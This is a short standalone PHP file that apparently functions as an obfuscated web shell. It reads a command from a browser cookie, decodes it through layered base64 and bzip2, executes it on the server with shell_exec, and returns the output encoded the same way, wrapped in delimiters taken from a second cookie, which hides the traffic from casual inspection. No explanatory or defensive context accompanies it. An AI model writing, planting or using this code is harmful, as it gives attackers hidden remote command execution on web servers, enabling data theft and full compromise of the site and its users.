<?php
    $d = base64_decode(bzdecompress(base64_decode($_COOKIE['d'])));
    $c = base64_decode(bzdecompress(base64_decode($_COOKIE['c'])));
    echo $d.base64_encode(bzcompress(base64_encode(shell_exec($c)), 9)).$d;
?>